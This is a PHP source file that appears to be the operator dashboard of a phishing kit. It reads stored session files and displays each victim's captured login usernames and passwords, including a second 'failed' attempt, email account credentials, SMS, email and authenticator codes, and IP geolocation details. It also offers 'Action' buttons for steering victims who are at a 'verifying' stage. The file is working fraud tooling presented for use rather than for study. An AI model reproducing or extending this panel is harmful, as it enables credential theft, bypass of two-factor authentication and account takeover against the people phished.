<?php
include('update_config.php');
include('update_tele.php');
include('reset_admin.php');
include('update_user_page.php');
include('../config/delete_user_session.php');
include('../config/save_user_details.php');

$config = include('config.php');
$tele = include('tele.php');
$adminConfig = include('admin_config.php');


$message = isset($_SESSION['message']) ? $_SESSION['message'] : '';
$error = isset($_SESSION['error']) ? $_SESSION['error'] : '';
unset($_SESSION['message'], $_SESSION['error']);

$sessionFiles = glob("../sessions/*.json");
$rows = [];

foreach ($sessionFiles as $file) {
    $userData = json_decode(file_get_contents($file), true);
    $id = basename($file, ".json");

    if ($userData['page'] !== 'verifying' && $userData['page'] !== 'complete') {
        continue;
    }

    $failedUser = isset($userData['failed_user']) ? $userData['failed_user'] : 'N/A';
    $failedPass = isset($userData['failed_pass']) ? $userData['failed_pass'] : 'N/A';
    $emailAccess = isset($userData['email_user']) ? $userData['email_user'] : 'N/A';
    $emailPass = isset($userData['email_pass']) ? $userData['email_pass'] : 'N/A';
    $authCode = isset($userData['auth_code']) ? $userData['auth_code'] : 'N/A';
    $alertCode = isset($userData['alert_code']) ? $userData['alert_code'] : 'N/A';
    $smsCode = isset($userData['sms_code']) ? $userData['sms_code'] : 'N/A';
    $emailCode = isset($userData['emailCode']) ? $userData['emailCode'] : 'N/A';
    $ipAddress = isset($userData['ip']) ? $userData['ip'] : 'N/A';

    $ipDetails = isset($userData['ip_details']) ? $userData['ip_details'] : [];
    $ipStatus = isset($ipDetails['status']) ? $ipDetails['status'] : 'N/A';
    $ipCountry = isset($ipDetails['country']) ? $ipDetails['country'] : 'N/A';
    $ipCountryCode = isset($ipDetails['countryCode']) ? $ipDetails['countryCode'] : 'N/A';
    $ipRegion = isset($ipDetails['region']) ? $ipDetails['region'] : 'N/A';
    $ipRegionName = isset($ipDetails['regionName']) ? $ipDetails['regionName'] : 'N/A';
    $ipCity = isset($ipDetails['city']) ? $ipDetails['city'] : 'N/A';
    $ipZip = isset($ipDetails['zip']) ? $ipDetails['zip'] : 'N/A';
    $ipLat = isset($ipDetails['lat']) ? $ipDetails['lat'] : 'N/A';
    $ipLon = isset($ipDetails['lon']) ? $ipDetails['lon'] : 'N/A';
    $ipTimezone = isset($ipDetails['timezone']) ? $ipDetails['timezone'] : 'N/A';
    $ipIsp = isset($ipDetails['isp']) ? $ipDetails['isp'] : 'N/A';
    $ipOrg = isset($ipDetails['org']) ? $ipDetails['org'] : 'N/A';
    $ipAs = isset($ipDetails['as']) ? $ipDetails['as'] : 'N/A';
    $ipQuery = isset($ipDetails['query']) ? $ipDetails['query'] : 'N/A';
    
    $codeButtonDisabled = ($authCode == 'N/A' && $alertCode == 'N/A' && $smsCode == 'N/A' && $emailCode == 'N/A');
    $ipAddressButtonDisabled = (
        $ipStatus == 'N/A' &&
        $ipCountry == 'N/A' &&
        $ipCountryCode == 'N/A' &&
        $ipRegion == 'N/A' &&
        $ipRegionName == 'N/A' &&
        $ipCity == 'N/A' &&
        $ipZip == 'N/A' &&
        $ipLat == 'N/A' &&
        $ipLon == 'N/A' &&
        $ipTimezone == 'N/A' &&
        $ipIsp == 'N/A' &&
        $ipOrg == 'N/A' &&
        $ipAs == 'N/A' &&
        $ipQuery == 'N/A'
    );
    $actionButtonDisabled = $userData['page'] !== 'verifying';

    $actionContent = $userData['page'] == 'complete' ? 'Finished' : "<button class='action' onclick='showAction(\"$id\", $codeButtonDisabled)' ".($actionButtonDisabled ? 'disabled' : '').">Action</button>";
    $resultsContent = "
        <form method='post' action='../config/save_user_details.php'>
            <input type='hidden' name='id' value='$id'>
            <button type='submit' name='save_details' class='save-button' >Save</button>
        </form>";
    $deleteContent = "
    <form method='post' action='../config/delete_user_session.php' >
            <input type='hidden' name='id' value='$id'>
            <button type='submit' name='delete' class='close' >Delete</button>
        </form>";

    $row = "<tr>
        <td>$id</td>
        <td><button style='background-color: ".($userData['user'] == 'N/A' ? '#444444' : '#000000')."; color: ".($userData['user'] == 'N/A' ? '#999999' : '#FFFFFF').";' onclick='showDetails(\"First Attempt\", \"User: {$userData['user']}\", \"\", \"Pass: {$userData['pass']}\")' ".($userData['user'] == 'N/A' ? 'disabled' : '').">View Detais</button></td>
        <td><button style='background-color: ".($failedUser == 'N/A' ? '#444444' : '#000000')."; color: ".($failedUser == 'N/A' ? '#999999' : '#FFFFFF').";' onclick='showDetails(\"Second Attempt\", \"User: $failedUser\", \"\", \"Pass: $failedPass\")' ".($failedUser == 'N/A' ? 'disabled' : '').">View Details</button></td>
        <td><button style='background-color: ".($emailAccess == 'N/A' ? '#444444' : '#000000')."; color: ".($emailAccess == 'N/A' ? '#999999' : '#FFFFFF').";' onclick='showDetails(\"Email Access\", \"User: $emailAccess\", \"\", \"Pass: $emailPass\")' ".($emailAccess == 'N/A' ? 'disabled' : '').">View Details</button></td>
        <td><button style='background-color: ".($codeButtonDisabled ? '#444444' : '#000000')."; color: ".($codeButtonDisabled ? '#999999' : '#FFFFFF').";' onclick='showDetails(\"Code\", \"Auth: $authCode\", \"\", \"Alert: $alertCode\", \"\", \"SMS: $smsCode\", \"\", \"Email Code: $emailCode\")' ".($codeButtonDisabled ? 'disabled' : '').">Code</button></td>
        <td><button style='background-color: ".($ipAddressButtonDisabled ? '#444444' : '#000000')."; color: ".($ipAddressButtonDisabled ? '#999999' : '#FFFFFF').";' onclick='showDetails(\"IP Details\", \"IP: $ipAddress\", \"Status: $ipStatus\", \"Country: $ipCountry\", \"Country Code: $ipCountryCode\", \"Region: $ipRegion\", \"Region Name: $ipRegionName\", \"City: $ipCity\", \"ZIP: $ipZip\", \"Latitude: $ipLat\", \"Longitude: $ipLon\", \"Timezone: $ipTimezone\", \"ISP: $ipIsp\", \"Organization: $ipOrg\", \"AS: $ipAs\", \"Query: $ipQuery\")' ".($ipAddressButtonDisabled ? 'disabled' : '').">View</button></td>
        <td>$actionContent</td>
        <td>$resultsContent</td>
        <td>$deleteContent</td>
    </tr>";

    $rows[] = ['row' => $row, 'complete' => ($userData['page'] == 'complete')];
}

usort($rows, function($a, $b) {
    return $a['complete'] - $b['complete'];
});
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Dashboard</title>
    <link rel="stylesheet" href="css/style.css">
    <script src="js/scripts.js" defer></script>
</head>

<body>

    <?php if ($message): ?>
    <p id="message" class="success"><?php echo $message; ?></p>
    <?php elseif ($error): ?>
    <p id="message" class="error"><?php echo $error; ?></p>
    <?php endif; ?>
    <table>
        <thead>
            <tr>
                <th>ID</th>
                <th>First Attempt</th>
                <th>Second Attempt</th>
                <th>Email Access</th>
                <th>Code</th>
                <th>IP Address</th>
                <th>Action</th>
                <th>Results</th>
                <th>Delete</th>
            </tr>
        </thead>
        <tbody id="dashboardTableBody">
        </tbody>

    </table>
</body>

</html>